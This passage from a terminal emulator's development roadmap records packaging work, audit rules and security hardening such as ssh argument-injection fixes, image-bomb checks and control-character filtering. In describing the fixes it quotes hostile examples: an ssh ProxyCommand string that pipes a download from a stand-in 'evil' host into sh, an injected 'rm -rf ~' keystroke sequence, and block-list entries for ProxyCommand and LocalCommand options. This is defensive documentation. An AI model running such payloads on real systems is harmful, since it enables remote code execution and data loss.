  tightened Keywords, StartupWMClass, two Desktop Actions for
  NewWindow + QuakeMode). CMake install rules via `GNUInstallDirs`
  cover desktop / metainfo / six hicolor icons, and CI runs
  `appstreamcli validate --explain` + `desktop-file-validate` on every
  push. `MimeType=` entries deliberately omitted — Ants doesn't
  register any URL-scheme handlers, so claiming them would be false
  metadata. Follow-up: add real UI screenshots under
  `docs/screenshots/` and a `<screenshots>` block in the metainfo so
  GNOME Software tiles render a preview instead of the app icon. See
  [CHANGELOG.md §0.6.17](CHANGELOG.md#0617--2026-04-14).
- ✅ **H3 — Man page**. Shipped in 0.6.18.
  `packaging/linux/ants-terminal.1` in `groff -man` covering synopsis,
  description, every CLI flag (`-h`/`--help`, `-v`/`--version`,
  `--quake`/`--dropdown`, `--new-plugin <name>` with the full
  validation contract), environment variables (`SHELL`, `HOME`,
  `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `ANTS_PLUGIN_DEV`,
  `QT_QPA_PLATFORM`), files
  (`~/.config/ants-terminal/{config.json,themes,plugins}`,
  `~/.local/share/ants-terminal/{sessions,recordings,logs}`,
  `<project>/{audit_rules.json,.audit_suppress}`), exit status (the
  four `--new-plugin` codes), bugs (GitHub issues link, SECURITY.md
  for embargoed reports), authors, and see-also (xterm, konsole,
  gnome-terminal, tmux, ssh, forkpty(3), appstreamcli,
  desktop-file-validate). CMake install rule to
  `${CMAKE_INSTALL_MANDIR}/man1/`. CI lints the source with
  `groff -man -Tutf8 -wall …` so syntax regressions fail the build
  the same way `appstreamcli` / `desktop-file-validate` do for H2.
  See [CHANGELOG.md §0.6.18](CHANGELOG.md#0618--2026-04-15).
- ✅ **H4 — Shell completions (bash / zsh / fish)**. Shipped in
  0.6.19. `packaging/completions/ants-terminal.bash` registers an
  `_ants_terminal` function via `complete -F`;
  `packaging/completions/_ants-terminal` is a `#compdef` script using
  `_arguments` with proper exclusion groups (`--quake` ⇄ `--dropdown`,
  `-h` / `-v` short-circuit); `packaging/completions/ants-terminal.fish`
  uses one `complete -c` declaration per flag with manpage-aligned
  descriptions. CMake installs each to the conventional vendor
  location (`${datarootdir}/bash-completion/completions/ants-terminal`,
  `${datarootdir}/zsh/site-functions/_ants-terminal`,
  `${datarootdir}/fish/vendor_completions.d/ants-terminal.fish`); all
  three are auto-discovered on system-wide installs. CI lints each
  file with the matching shell's `-n` / `--no-execute` flag so syntax
  regressions fail the build. Closes the H1–H4 distribution slice;
  remaining packaging work (H5 distro recipes, H6 Flatpak, H7 docs
  site) lives in 0.8.0+. See [CHANGELOG.md §0.6.19](CHANGELOG.md#0619--2026-04-15).

### 🧰 Dev experience — Project Audit tool

Surfaced by the 0.6.5 audit pass (see [CHANGELOG.md §0.6.5](CHANGELOG.md#065--2026-04-14)).
Each item is a rule / self-check the in-app `AuditDialog` should grow so
findings like the ones we caught manually would be caught automatically on
the next run.

- ✅ **Qt rule: unbounded callback payloads.** Shipped in 0.6.8 as
  `unbounded_callback_payloads` — same-line regex flags
  `QString::fromUtf8(<expr>.c_str()…)` forwarded to a `*Callback(…)`
  without a `.left()` / `.truncate()` / `.mid()` / `.chopped()` /
  `.chop()` cap. See [CHANGELOG.md §0.6.8](CHANGELOG.md#068--2026-04-14).
- ✅ **Qt rule: `QNetworkReply` connects without context.** Shipped in
  0.6.8 as `qnetworkreply_no_abort` — flags 3-arg `connect()` to
  QNetworkReply signals whose third argument is a bare lambda (no
  context object means no auto-disconnect on owner destruction → UAF
  if reply fires after `this` is gone). The 4-arg form is enforced.
  See [CHANGELOG.md §0.6.8](CHANGELOG.md#068--2026-04-14).
- ✅ **Observability rule: silent `catch (...)`.** Shipped in 0.6.7 as
  `silent_catch` — flags empty same-line `catch(...) {}` handlers.
  Extending to multi-line / single-statement trivial bodies remains future
  work (`grep -Pzo` plumbing). See [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Self-consistency: fixture-per-`addGrepCheck`.** Shipped in 0.6.6 —
  `audit_fixture_coverage` rule in the dialog + CI-enforced cross-check in
  `tests/audit_self_test.sh`. See [CHANGELOG.md §0.6.6](CHANGELOG.md#066--2026-04-14).
- ✅ **Build-flag recommender.** Shipped in 0.6.7 as `missing_build_flags`
  — scans the top-level `CMakeLists.txt` for `-Wformat=2`, `-Wshadow`,
  `-Wnull-dereference`, `-Wconversion`. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **No-CI check.** Shipped in 0.6.7 as `no_ci` — covers `.github/workflows/`,
  `.gitlab-ci.yml`, `.circleci/`, `.travis.yml`, and `Jenkinsfile`. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Sanitizer-in-ctest hookup.** Shipped in 0.6.7 — dedicated `build-asan`
  job in `.github/workflows/ci.yml` runs ctest + a binary smoke test under
  ASan/UBSan with `QT_QPA_PLATFORM=offscreen` on every push. See
  [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **`CONTRIBUTING.md`.** Shipped in 0.6.7 — derived from `STANDARDS.md`,
  covers build modes, test layout, adding an audit rule, version-bump
  checklist. See [CHANGELOG.md §0.6.7](CHANGELOG.md#067--2026-04-14).
- ✅ **Upgrade `actions/checkout` to v5 (Node.js 24).** Shipped in
  0.7.0. Both `.github/workflows/ci.yml` pin sites bumped to
  `actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd  # v5.0.1`
  (v5.0.0 and v5.0.1 both resolve to the same SHA; v5.0.1 is the
  currently-latest patch). Landed in commit `aad4f32`. Input surface
  is stable across v4→v5 — no workflow changes required. See
  [CHANGELOG.md §0.7.0](CHANGELOG.md#070--2026-04-19).

---

## 0.7.7 — hardening pass (target: 2026-05)

**Theme:** four-dimensional review (perf / security / bugs / refactor)
commissioned 2026-04-22 across the full codebase. Findings triaged into
three cohorts — **(A) shipped in-tree in this release** (the small,
verified, low-blast-radius fixes that went in before this ROADMAP update
so 0.7.7 has real content), **(B) 0.7.7 planned work** (medium-scope,
self-contained), and **(C) deferred to 0.8+** (large refactors and
architecture-level perf work that deserves its own release arc). Each
item carries the dimension tag (⚡ perf, 🔒 security, 🐛 bug,
🧹 refactor) so the release notes can group them.

### 🐛 / 🔒 — Shipped alongside this ROADMAP revision

- ✅ **🐛 `insertLines` / `deleteLines` now sync `m_screenHyperlinks`.**
  Was: CSI L / CSI M shifted `m_screenLines` rows without moving the
  parallel OSC 8 hyperlink table, so clickable spans drifted away from
  the cells containing the link text after any `vim :delete` /
  `:insert` burst. Now: the same erase/insert pattern runs against
  `m_screenHyperlinks`, gated on `bottom < m_screenHyperlinks.size()`
  so under-populated tables (lazy-grow path at
  `TerminalGrid::addRowHyperlink`) don't throw.
  Fix in `src/terminalgrid.cpp` (insertLines/deleteLines bodies).
- ✅ **🐛 Resize clamps `m_hyperlinkStartRow` / `m_hyperlinkStartCol`.**
  Was: shrinking the grid below the row where an OSC 8 was opened left
  the start coordinates pointing at a no-longer-existent row — a later
  grow-back would attach the span to a row whose content no longer
  matched. Now: both fields are `std::clamp`'d on every resize, same
  as `m_cursorRow/Col`.
- ✅ **🔒 SSH bookmark argv-injection hardening (CVE-2017-1000117
  class).** `SshBookmark::toSshCommand` now inserts `--` before the
  host argument, stopping OpenSSH from parsing a host whose value
  begins with `-` as an option (classic
  `-oProxyCommand=bash -c 'curl evil|sh'` trick). Shell-quoting alone
  does not defend against this — the shell passes the value correctly
  but `ssh` itself then re-interprets the leading dash.
- ✅ **🔒 Image-bomb defence: PNG dimension peek before decode.** Both
  decode sites (OSC 1337 iTerm2 and Kitty graphics PNG path) now use
  `QImageReader::size()` to read the PNG header and reject images
  declaring dimensions over `MAX_IMAGE_DIM` (4096) *before* calling
  `QImage::loadFromData`. Prevents a 1 KB compressed PNG declaring
  100 000 × 100 000 from forcing a multi-GB decompression allocation
  in the millisecond window before the post-decode dimension guard
  fires. Follows the
  [Qt6 untrusted-data guidance](https://doc.qt.io/qt-6/untrusteddata.html).
- ✅ **🔒 OSC/DCS/APC buffer memory release after dispatch.** Was: an
  attacker who streamed a ~10 MB inline image left three 10 MB
  `std::string` buffers sitting at full capacity in the VtParser for
  the lifetime of the process (30 MB permanent overhead per terminal),
  because `.clear()` doesn't shrink. Now: dispatch does
  `std::move` into the `VtAction`, then a `releaseIfLarge` helper
  swap-deallocates when capacity exceeds 64 KB. Normal-traffic buffers
  stay cheap; adversarial ones don't linger.

### 🐛 / ⚡ / 🧹 — Shipped in the 0.7.7 planned-work pass

- ✅ **🐛 Audit-pipeline regression coverage for the 0.7.7 hardening fixes.**
  Four new `tests/features/` subtrees lock the 0.7.6 → 0.7.7 fixes with
  the same "fails on pre-fix code" guarantee the rest of the feature
  suite carries:
  - `osc8_insert_delete_lines/` — feeds OSC 8 at row 5, issues CSI 2 L
    from cursor row 2, asserts the span now lives at row 7. Pre-fix,
    the span stayed on row 5 because `m_screenHyperlinks` was never
    shifted.
  - `hyperlink_resize_clamp/` — opens an OSC 8 at (20, 50), shrinks to
    (5, 10), closes with OSC 8 close, asserts the span lands on a row
    in `[0, 4]`. Pre-fix, the close site's upper-bound guard silently
    dropped the span because `m_hyperlinkStartRow` still held 20.
  - `ssh_dash_host_rejected/` — constructs `SshBookmark` in five
    scenarios (plain, user@host, identity+port, extraArgs, malicious
    `-oProxyCommand=evil`) and asserts every command contains ` -- `
    before the host token. Catches any future refactor that drops the
    argv terminator.
  - `image_bomb_png_header_peek/` — static source inspection of
    `src/terminalgrid.cpp`: every `loadFromData(...)` call must be
    preceded by a `QImageReader` peek in the 10 lines above or carry a
    `// image-peek-ok` marker. Runtime fuzz would either succeed
    (no signal) or hang CI (no signal either).
- ✅ **⚡ `isCellSearchMatch` — linear scan → `std::lower_bound`.**
  `m_searchMatches` is sorted by `globalLine`; the binary search jumps
  to the first match ≥ current line, then iterates only matches whose
  `globalLine` equals it. The previous impl self-described as "binary
  search" but walked the whole vector from index 0. Expected win: 5–20%
  of paint time on search-highlighted content.
- ✅ **⚡ `QFontMetrics` hoisted out of the per-cell underline loop.**
  `updateFontMetrics()` now caches `underlinePos` + `lineWidth` into
  `m_fontUnderlinePos` / `m_fontLineWidth` members; the underline
  drawing path reads the members directly. Relevant on TUI apps that
  underline every cell (Claude Code's SGR 4 pattern).
- ✅ **⚡ Selection-bounds normalisation lifted out of `isCellSelected`.**
  `paintEvent` now normalises the selection once per frame into local
  `selLineStart` / `selColStart` / `selLineEnd` / `selColEnd` /
  `selRectColMin` / `selRectColMax`, and uses an inline `cellInSelection`
  lambda that consumes the pre-normalised values. The `isCellSelected`
  method is kept for the other callers (`selectedText` etc.) but the
  hot-path caller no longer re-runs `std::swap` + `std::min`/`std::max`
  for every cell in the frame.
- ✅ **🧹 `setOwnerOnlyPerms` helper (`src/secureio.h`).** The bitmask
  `QFileDevice::ReadOwner | QFileDevice::WriteOwner` was previously
  repeated at 11 call sites across `config.cpp`, `sessionmanager.cpp`
  (×2), `claudeallowlist.cpp`, `auditdialog.cpp` (×4),
  `claudeintegration.cpp` (×2), `remotecontrol.cpp`, and
  `auditrulequality.cpp`. One typo (`ReadOther`, `ReadGroup`) away
  from widening access to a file that may hold an API key. Two-overload
  helper: `setOwnerOnlyPerms(QFileDevice&)` for open handles (QFile /
  QSaveFile) and `setOwnerOnlyPerms(const QString&)` for existing
  paths (socket perms, post-close repairs). Every call site is now
  routed through one of the two. The one surviving 0755 case in
  `settingsdialog.cpp` (hooks shell script — needs executable bit for
  every user role) stays literal by design.
- ✅ **🧹 Shared `shellQuote` helper (`src/shellutils.h`).** Previously
  a static function in `sshdialog.cpp` and *re-defined as a local
  lambda* in `mainwindow.cpp::openClaudeProjectsDialog` — two implem-
  entations of regex-based single-quote-escaping, one that handled
  empty strings / pass-throughs and one that didn't. Consolidated into
  one inline header; both call sites rewritten to use it.

### 💭 0.8+ deferred — larger scope

- ⚖️ **⚡ `scrollUp` / `scrollDown` — erase/insert loop → `std::rotate`
  (investigated 0.7.9, not shipped).** Hot path during every newline
  in a full-window scroll. The theoretical win was "one O(rows) rotate
  instead of a count-length O(rows) loop," but the newline-stream case
  is always `count == 1`, which reduces the old `erase(begin) +
  insert(end)` to one shift + push_back — practically identical to
  `std::rotate(first, first+1, last)`'s save/shift/restore cycle, with
  rotate's save-and-restore costing ~2 extra moves per call. Measured
  on `bench_vt_throughput newline_stream` the rotate path was 12–15%
  **slower** (5.2 → 4.6 MB/s) because rotate paid for the save/restore
  while the blank-overwrite still had to allocate the bottom row.
  The real bottleneck is the per-scroll `makeRow(m_cols, ...)` +
  `vector<Cell>` allocation, plus the heap handoff to scrollback —
  not the container shuffle. A future perf pass should replace the
  scrollback push with a cell-vector swap (keeping the capacity in
  the screen row, transferring only the populated-cell snapshot to
  scrollback) or move to a ring-buffered screen grid. The 0.7.9
  investigation did ship the guard: `tests/features/scroll_region_rotate`
  pins the observable semantics so the next attempt can refactor
  safely.
- ✅ **⚡ Cell-buffer free-list for scroll paths (shipped 0.7.10).**
  Small `m_freeCellBuffers` pool (cap 4 entries) + `takeBlankedCellsRow()`
  / `returnCellsRow()` helpers. `scrollUp`, `scrollDown`, `insertLines`,
  `deleteLines` recycle cell buffers instead of calling `makeRow(m_cols, …)`
  on every scroll. When `m_scrollback` hits capacity and evicts a line,
  its cells vector is salvaged into the pool; the next scroll's new
  bottom row pulls from it, skipping the allocator. Measured
  **+15.8 %** on `bench_vt_throughput newline_stream` (5.26 → 6.09
  MB/s, median of ten-run pairs). Other corpora flat to mildly
  improved; `utf8_cjk` also gained +12 %. First perf result to
  validate the 0.7.9 thesis that the container shuffle was a red
  herring and the allocator was the actual hot spot.
- ✅ **⚡ Per-frame `QString` construction in the text-run accumulator
  (shipped 0.7.9).** `QString::fromUcs4()` used to be called per
  non-space cell in both `TerminalWidget::paintEvent` and
  `GlRenderer::render`; the run was then built via repeated
  `QString::operator+=`. Reworked to accumulate codepoints into a
  reusable `std::vector<char32_t>` on the `Run` struct and call
  `QString::fromUcs4(data, size)` exactly once at run-push time. The
  vector is reused across runs within a frame (cleared on push), so
  steady-state allocation is amortised.
- ✅ **⚡ Combining-char map in-place key remap on `deleteChars` /
  `insertBlanks` (shipped 0.7.11).** Old impl built a new
  `unordered_map` then move-assigned it, re-hashing every surviving
  entry and reallocating buckets. Rewrote to use node-handle
  `extract()` + key-mutate + `insert()`: the map's nodes are detached,
  their integer key field is set to the shifted column, and the nodes
  are reinserted — no bucket reallocation, no re-hashing of the value
  vector. Empty-map fast-path short-circuits the whole block.
  deleteChars sorts shifted keys ascending (leftward shift can't
  collide in ascending order); insertBlanks sorts descending (rightward
  shift can't collide in descending order).
- ⚖️ **🧹 Dialog base class (investigated 0.7.9, rejected).** Only
  `settingsdialog.cpp` and `claudeallowlist.cpp` actually use
  `QDialogButtonBox` with Ok/Apply/Cancel; the other four dialogs
  (`aidialog`, `sshdialog`, `claudeprojects`, `auditdialog`) have
  bespoke button layouts without the triplet pattern. Extracting a
  `DialogBase` with `setupStandardButtons` would save ~10 lines across
  2 call sites — premature abstraction with real regression surface
  (each call site has subtle per-dialog validation / error-hint
  wiring). Deferred unless/until a third dialog needs the pattern.
- ⚖️ **🧹 `ManagedProcess` (investigated 0.7.9, rejected).**
  `auditdialog.cpp` uses a single shared `QProcess` member that runs
  checks serially, not "six copies." The timeout-and-cleanup dance is
  already at one call site. Other files that launch processes
  (`claudeintegration.cpp` for `claude` binary, `ssh` via `Pty`) have
  one-off patterns with no shared structure to extract. Re-file if a
  second generalised process-runner emerges.
- ✅ **🔒 IPC-socket `/tmp` fallback stat-guard (shipped 0.7.11).**
  `remotecontrol.cpp` still defaults to `XDG_RUNTIME_DIR` (correct,
  0700 perms) but now gates every `QLocalServer::removeServer(path)`
  call behind a `lstat()` check. Uses `lstat` (not `stat`) so a
  symlink reports as a symlink and is refused. Requires `S_ISSOCK(mode)`
  AND `st_uid == getuid()`; `ENOENT` passes through (nothing to remove).
  On refusal the remote-control layer disables itself with a clear
  log message instead of unlinking an unknown file.

### ✅ Shipped in 0.7.8 — Fold-in to the project audit tool

Every finding that is expressible as a repo-wide grep / AST pattern
becomes a persistent audit rule — that's how a review turns into a
regression guard instead of a one-off sweep. The 0.7.8 release adds
three new rules so the 0.7.6 / 0.7.7 hardening sweep leaves behind
automation, not just diffs. All three fire cleanly on the current
tree: the shipped fix sites are suppressed by the intended runtime
filter (`<< "--"` guard, `image-peek-ok` tag, `disable-file` on the
helper itself):

- ✅ `ssh_argv_dash_host` (Security, Major) — matches
  `<< shellQuote(...host...)` and drops findings when `<< "--"`
  appears within ±5 lines. Context window is 5 (not 3 as originally
  specced) to span the `if (!user.isEmpty()) / else` split in
  `sshdialog.cpp:67-71`.
- ✅ `qimage_load_without_peek` (Qt, Minor) — matches
  `.loadFromData(` and drops findings tagged `// image-peek-ok` or
  preceded by `QImageReader` within ±5 lines. Two shipped sites in
  `terminalgrid.cpp` carry the reviewer sign-off tag.
- ✅ `setPermissions_pair_no_helper` (Qt, Info) — matches
  `setPermissions(... QFileDevice::ReadOwner | WriteOwner)` and
  nudges toward `setOwnerOnlyPerms()` from `src/secureio.h`. Pattern
  excludes the 0755 hook-script case (extra `|` flags). The helper
  itself is suppressed via `// ants-audit: disable-file`.

See the [feature-coverage audit lane](CHANGELOG.md#076--2026-04-22)
work in 0.7.6 for the precedent of "each review leaves a detector
behind."

### 📚 Prior-art references consulted for this release

- [ANSI Terminal security in 2023 and finding 10 CVEs](https://dgl.cx/2023/09/ansi-terminal-security) — CVE-2022-41322 (Kitty OSC desktop notification), ConEmu CVE-2022-46387 / CVE-2023-39150, iTerm2 CVE-2022-45872 (DECRQSS mishandling); the OSC/DCS/APC buffer-release work above is in the same class.
- [Qt6 Handling Untrusted Data](https://doc.qt.io/qt-6/untrusteddata.html) — Qt's own warning that `QDataStream` demarshalling operators allocate based on stream-declared sizes with no sanity check; motivates the `QImageReader` size-peek pattern used here and is the reference for a future pass on `SessionManager` deserialisation.
- [CVE-2017-1000117](https://nvd.nist.gov/vuln/detail/CVE-2017-1000117) — git-ssh argv injection via dash-prefixed host; the ssh-bookmark `--` fix above is a direct port of the mitigation.

---

## 0.7.12 — independent-review sweep (target: 2026-05)

**Theme:** fold-in of the 2026-04-23 multi-agent code review. Fourteen
independent `general-purpose` subagents were dispatched in parallel — one
per subsystem — each briefed only with source paths + contract docs
(`CLAUDE.md`, `PLUGINS.md`, `tests/features/*/spec.md`) and external
standards (ECMA-48, xterm ctlseqs, POSIX `forkpty(3)`, SARIF v2.1.0,
OpenAI API, SSE, Lua 5.4 Reference Manual, OWASP LLM Top 10,
CVE-2017-1000117, OpenGL 3.3). Agents had **zero context on
implementation reasoning** — they reviewed code against contracts, not
against intent. This is the "escape the self-graded-homework bubble"
lane: findings here come from outside the author's head.

The sweep produced ~60 HIGH findings, ~80 Medium, and ~40 Low. This
section tracks the HIGH findings plus cross-cutting themes that were
flagged by multiple independent reviewers. Medium/Low findings are
captured in the review transcripts (commit `<tbd>`) and triaged into
grep rules or individual tickets as they become actionable.

### 🔥 Cross-cutting themes (patterns caught by ≥2 reviewers)

- 📋 **Silent-data-loss on parse failure.** `config.cpp:26-33`,
  `claudeallowlist.cpp:241-281`, `sessionmanager.cpp` V2+ unknown-field
  path all follow the same shape: read → parse → on failure `root` stays
  default-constructed → next save overwrites user data with defaults.
  Fix class-wide: **refuse to save when the on-disk file existed and
  failed to parse**, surface an error dialog, offer a `.bak` recovery.
- 📋 **`/tmp/*.js` TOCTOU via predictable filenames.** KWin script paths
  at `xcbpositiontracker.cpp:34`, `mainwindow.cpp:2558, 2620`. Replace
  with `QTemporaryFile` (O_EXCL, unpredictable name).
- 📋 **`setOwnerOnlyPerms` ordering bugs.** `sessionmanager.cpp:269`
  (perms before write), `claudeallowlist.cpp:273-281` (pre-commit on a
  temp fd — rename may drop perms), `debuglog.cpp:72` (no perms at all
  on a log that holds PTY + HMAC + network material).
- 📋 **"Documented feature, dead code" drift** — 5 distinct cases caught
  by 4 different reviewers:
  - `gpu_rendering` config key live but `glrenderer.cpp` unreachable
    since 0.7.4 base-class refactor (widget no longer `QOpenGLWidget`).
    `tests/features/terminal_partial_update_mode/spec.md` INV-1 is a
    dead invariant.
  - `background_alpha` persisted to config but `terminalwidget.cpp:604-609`
    uses `m_windowOpacity`, never `m_backgroundAlpha`.
  - Claude plan-mode detection at `claudeintegration.cpp:495` reads
    `value("mode")` — real JSONL uses `permissionMode`. `planModeChanged(true)`
    has never fired in production.
  - `session_persistence` default: `CLAUDE.md` says `false`, `config.cpp:225`
    says `true` (the code default is correct per spec, docs drift).
  - `font_size` range: `CLAUDE.md` says 8–32, `config.cpp:84` and
    `settingsdialog.cpp:167` both 4–48 (three-way drift).
- 📋 **No-auth local IPC is a UID-scope RCE chain.** Remote control
  listens by default (`mainwindow.cpp:788`), accepts unauthenticated
  commands (`remotecontrol.cpp:66-113`), and `send-text` writes raw
  bytes to the PTY with no control-char filtering (`remotecontrol.cpp:235`).
  Any process under the user's UID (compromised browser tab,
  `pip install` post-exec, random npm dependency) can shove
  `\nrm -rf ~\n` into the next tab's shell. Blast radius = UID. Two
  reviewers independently recommended defaulting `remote_control_enabled=false`
  and landing control-char filtering before the X25519 auth work.

### 🔒 Tier 1 — ship-this-week fixes (security/data-loss blockers)

- ✅ **`permissionMode` field-name typo.** `claudeintegration.cpp:495`
  read `value("mode")`; real Claude Code JSONL (verified against live
  `~/.claude/projects/*.jsonl` at v2.1.87) uses `permissionMode`.
  Fixed; `planModeChanged(true)` now actually fires on plan-mode entry.
  Regression test anchored to real JSONL schema:
  `tests/features/claude_plan_mode_detection/`.
- ✅ **Remote-control opt-in default + `send-text` control-char filter.**
  Added `remote_control_enabled` config key (default `false`, matches
  Kitty `allow_remote_control=no`). The MainWindow now gates the
  listener's `start()` on this key. `send-text` request payloads pass
  through `RemoteControl::filterControlChars` which strips
  `{0x00..0x08, 0x0B..0x1F, 0x7F}` while preserving HT/LF/CR and all
  UTF-8 bytes >= 0x80. Callers needing raw byte pass-through set
  `"raw": true` in the request JSON. Closes the UID-scope keystroke-
  injection RCE chain. Regression test:
  `tests/features/remote_control_opt_in/`.
- ✅ **Parse-failure-overwrites-data — Config + Allowlist + shared
  helper.** `Config::load()` now distinguishes fresh-run / valid /
  corrupt. On corrupt, the on-disk file is rotated to
  `config.json.corrupt-<ms_timestamp>[-N]` via the new shared
  `rotateCorruptFileAside()` helper (secureio.h) with a
  collision-retry loop up to 10 attempts (addresses the /indie-review
  same-second-collision HIGH finding). `m_loadFailed` is latched;
  `save()` is a no-op for the session so setters can't destroy the
  user's hand-fixable bytes. Separate log messages for success vs
  failed backup.
  `ClaudeAllowlistDialog::saveSettings()` adopts the same pattern:
  parse failure refuses to save rather than destroying the non-
  permissions keys (model, editor prefs, custom hooks).
  `SessionManager` verified as already-defended — its per-tab files
  use granular `QDataStream::status()` checks at every read, and
  failure returns false without clobbering the file.
  Regression test: `tests/features/config_parse_failure_guard/`
  (behavioral: plants a corrupt file, asserts setter doesn't
  overwrite).
- ✅ **`std::rename` return checked + errno logged.** `config.cpp`
  save path: rename failure logs errno via
  `ANTS_LOG(DebugLog::Config, ...)` and removes the orphan tmp file.
  `.bak` rotation subsumed by the parse-failure backup above.
- ✅ **SSH bookmark `extraArgs` ProxyCommand/LocalCommand rejection.**
  `SshBookmark::sanitizeExtraArgs` filters `-oProxyCommand=`,
  `-oLocalCommand=`, `-oPermitLocalCommand=` in both the
  single-token and space-separated forms (case-insensitive per
  OpenSSH's own option parser). Closes the CVE-2017-1000117-adjacent
  RCE-via-bookmark-field vector. Regression test:
  `tests/features/ssh_extra_args_sanitize/` (20 assertions covering
  both forms, case variants, end-to-end `toSshCommand`).
- ✅ **`/tmp/kwin_*.js` → `QTemporaryFile`.** Three callsites
  (`xcbpositiontracker.cpp`, `mainwindow.cpp` twice) migrated from
  predictable filenames to unpredictable `QTemporaryFile` with
  `setAutoRemove(false)` (the async dbus-send chain removes the file
  after use). Closes the same-UID symlink-swap TOCTOU + same-name
  collision between Ants instances.
- ✅ **Audit rule-pack `command` trust gate.** `loadUserRules()` now
  skips rules with a `command` field unless
  `Config::auditTrustCommandRules() == true` or
  `ANTS_AUDIT_TRUST_UNSAFE=1` is set. Default false — a cloned-but-
  untrusted project can no longer run arbitrary bash via
  `audit_rules.json`. Existing users who relied on command-rules
  opt in via config or env var; warning log surfaces the count of
  skipped rules at load time. Per-project hash-based trust store
  deferred to 0.7.13.
- ✅ **AI `insertCommand` prompt-injection mitigation.**
  `AiDialog::extractAndSanitizeCommand` (new static helper) strips
  C0 controls `{0x00..0x08, 0x0B..0x1F, 0x7F}` from the AI-suggested
  command while preserving HT/LF/CR + UTF-8 multi-byte, caps length
  at 4 KiB. The click handler now requires explicit user
  confirmation via a `QMessageBox::question` showing the literal
  bytes (with a "N bytes were filtered" note when non-zero) before
  emitting `insertCommand`. OWASP LLM01+LLM02 mitigation.
  Regression test: `tests/features/ai_insert_command_sanitize/`
  (18 assertions, behavioral + source-grep on the confirm-before-
  emit invariant).
- 📋 **SSH bookmark `extraArgs` ProxyCommand/LocalCommand rejection.**
  `sshdialog.cpp:56-60` tokenizes `extraArgs` and emits each token
  before `--`. A bookmark with `extraArgs="-oProxyCommand=curl evil|sh"`
  is CVE-2017-1000117 self-inflicted. Reject tokens starting with
  `-oProxyCommand=`, `-oLocalCommand=`, `-oPermitLocalCommand=yes`, or
  show a "this bookmark requests privileged ssh options" confirmation
  the first time it's used.
- 📋 **`/tmp/kwin_*.js` → `QTemporaryFile`.**
  `xcbpositiontracker.cpp:34`, `mainwindow.cpp:2558, 2620`.
- 📋 **Audit rule-pack `command` trust prompt.** `auditdialog.cpp:2580,
  3730` executes arbitrary `command` strings from
  `<project>/audit_rules.json` under `bash -c`. A malicious rule pack
  shipped via `git clone` of a contributed project runs code the
  moment the user opens the Audit dialog. Require explicit
  trust-this-file confirmation (stored in
  `~/.config/ants-terminal/trusted_audit_rules.json` keyed by project
  path + file hash) before any rule with a `command` field runs.
- 📋 **Audit user-glob path canonicalization.** `auditdialog.cpp:2323`
  (`globToRegex`), `auditdialog.cpp:2221-2223, 2064-2066`
  (`readSnippet` / `lineIsCode`). Enforce `startsWith(m_projectPath)`
  after canonicalization — reject `../` traversal in user rules.
- 📋 **AI `insertCommand` prompt-injection mitigation.**
  `aidialog.cpp:56-79` writes LLM-emitted bytes verbatim into the PTY.
  Minimum: confirmation dialog showing the literal bytes, strip
  embedded `\n`/`\r`/control chars, 4 KiB length cap. OWASP LLM01+LLM02.
- 📋 **Allowlist `QSaveFile` perms belt-and-suspenders.**
  `claudeallowlist.cpp:273-281` — call `setOwnerOnlyPerms` post-commit
  as well as pre-commit so the rename doesn't leave a world-readable
  file on filesystems that don't carry fd perms across rename.

### 🔒 Tier 2 — hardening sweep

- 📋 **PTY `closefrom` replacement.** `ptyhandler.cpp:84-85` hard-codes
  `fd=3; fd<1024`. Use `closefrom(3)` on glibc ≥2.34 or iterate
  `/proc/self/fd`. CWE-403 recurrence on systemd/container default
  RLIMIT_NOFILE.
- ✅ **Process-wide `signal(SIGPIPE, SIG_IGN)` in `main.cpp`.** Shipped
  0.6.28 (bc97485) but never regression-tested. Locked 0.7.17 via
  `tests/features/sigpipe_ignore` (source-grep invariants: the call
  exists, appears before `QApplication` construction, `<csignal>` is
  included).
- 📋 **PTY write EAGAIN queue.** `ptyhandler.cpp:180-197` currently drops
  data on partial write. Install a `QSocketNotifier(QSocketNotifier::Write)`
  and queue the remainder.
- 📋 **PTY dtor off-main-thread.** 500 ms `usleep` on GUI at
  `ptyhandler.cpp:37-40` × N splits = N×500 ms freeze on window close.
  Move escalation to a QThread.
- ✅ **RIS (`ESC c`) preserves all integration callbacks.** Shipped
  0.7.17. The reset handler now stashes + restores 8 callbacks
  (`response`, `bell`, `notify`, `lineCompletion`, `progress`,
  `commandFinished`, `userVar`, `osc133Forgery`) plus `m_osc133Key`.
  Security-relevant: previously a well-timed `tput reset` silenced
  the OSC 133 forgery alarm permanently. Locked by
  `tests/features/ris_preserves_callbacks` (all 8 callbacks fire
  pre-RIS, fire again post-RIS; key survives; grid state actually
  reset).
- 📋 **Origin-mode translate on CUP / DECSC save origin.**
  `terminalgrid.cpp:397-400, 1592-1595, 1611-1621`. Breaks
  tmux/screen save-restore round-trip.
- 📋 **OSC 8 URI cap + Kitty APC `m_kittyChunkBuffer` cap.**
  Currently unbounded; hostile apps can consume scrollback memory per
  covered line or grow a single buffer without limit.
- 📋 **`clearRow` uses current SGR bg (BCE).**
  `terminalgrid.cpp:1758-1778` uses `CellAttrs{}` — app-painted
  backgrounds disappear on every `CSI 2J` / `CSI J`.
- 📋 **Wide-char overwrite zeroes the mate.**
  `terminalgrid.cpp:327-347` leaves dangling `isWideCont` when a narrow
  char overwrites a wide char's first half (or vice versa).
- 📋 **`background_alpha` wiring — or remove from docs.**
  `terminalwidget.cpp:3874-3876` writes to a dead field. Decide: revive
  at paint site, or drop config key + doc entry.
- 📋 **`terminal_partial_update_mode` spec rewrite or delete.**
  Invariant assumes `QOpenGLWidget` base class that no longer exists.
- 📋 **Lua: strip `string.dump`, pass `"t"` mode to `luaL_loadfilex`.**
  `luaengine.cpp:76, 206-213`. Defense-in-depth on bytecode rejection.
- 📋 **Lua: cap manifest size + canonical plugin path.**
  `pluginmanager.cpp:138-143` reads entire `manifest.json` (OOM
  surface); `scanAndLoad` uses `QDir::entryList(QDir::Dirs)` without
  `NoSymLinks` or `canonicalFilePath()` anchor.
- 📋 **Lua: clear hook before `lua_close` in `shutdown()`.** Prevents
  UAF when finalizers run during destruction.
